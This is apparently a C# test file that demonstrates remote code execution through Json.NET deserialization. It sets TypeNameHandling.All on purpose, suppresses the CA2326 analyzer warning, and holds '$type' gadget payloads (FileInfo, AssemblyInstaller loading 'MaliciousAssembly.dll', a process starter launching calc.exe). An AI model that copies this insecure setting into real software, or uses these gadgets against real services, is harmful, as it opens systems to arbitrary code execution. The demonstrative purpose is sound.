using Newtonsoft.Json;
using System.Diagnostics;
using System.Xml.Serialization;

namespace SerializationRCE
{
    [System.Diagnostics.CodeAnalysis.SuppressMessage("Security", "CA2326:Do not use TypeNameHandling values other than None", Justification = "Test class. This is not production code.")]
    public class JsonDeserialization
    {

        string filePayload = """
            {
            	"$type": "System.IO.FileInfo, System.IO.FileSystem",
            	"fileName": "rce-test.txt"
            }
        """;

        string assemblyPayloadSimple = """
                        {"$type":"System.Configuration.Install.AssemblyInstaller, 
            System.Configuration.Install",
            "Path":"MaliciousAssembly.dll"}           
            """;

        string maliciousAssemblyLaunchPayload = """
            {"$type":"MaliciousAssembly.ProcessStarter, MaliciousAssembly",
            "ProcessLaunch":"calc.exe"
            }
            """;

        [Fact]
        [System.Diagnostics.CodeAnalysis.SuppressMessage("Style", "IDE0059:Unnecessary assignment of a value", Justification = "This is a test to demonstrate the vulnerability")]
        public void FileInfoJson()
        {
            JsonSerializerSettings serializerSettings = new JsonSerializerSettings();
            serializerSettings.TypeNameHandling = TypeNameHandling.All;

            object? returnClass = JsonConvert.DeserializeObject(filePayload, serializerSettings);
        }


        [Fact]
        [System.Diagnostics.CodeAnalysis.SuppressMessage("Style", "IDE0059:Unnecessary assignment of a value", Justification = "This is a test to demonstrate the vulnerability")]
        public void AssemblyLoaderJson()
        {
            JsonSerializerSettings serializerSettings = new JsonSerializerSettings();
            serializerSettings.TypeNameHandling = TypeNameHandling.All;

            object? returnClass = JsonConvert.DeserializeObject(assemblyPayloadSimple, serializerSettings);
        }

        [Fact]
        [System.Diagnostics.CodeAnalysis.SuppressMessage("Style", "IDE0059:Unnecessary assignment of a value", Justification = "This is a test to demonstrate the vulnerability")]
        public void MaliciousAssemblyLauncherJson()
        {
            JsonSerializerSettings serializerSettings = new JsonSerializerSettings();
            serializerSettings.TypeNameHandling = TypeNameHandling.All;

            object? installer = JsonConvert.DeserializeObject(assemblyPayloadSimple, serializerSettings);

            object? returnClass = JsonConvert.DeserializeObject(maliciousAssemblyLaunchPayload, serializerSettings);
        }

    }
}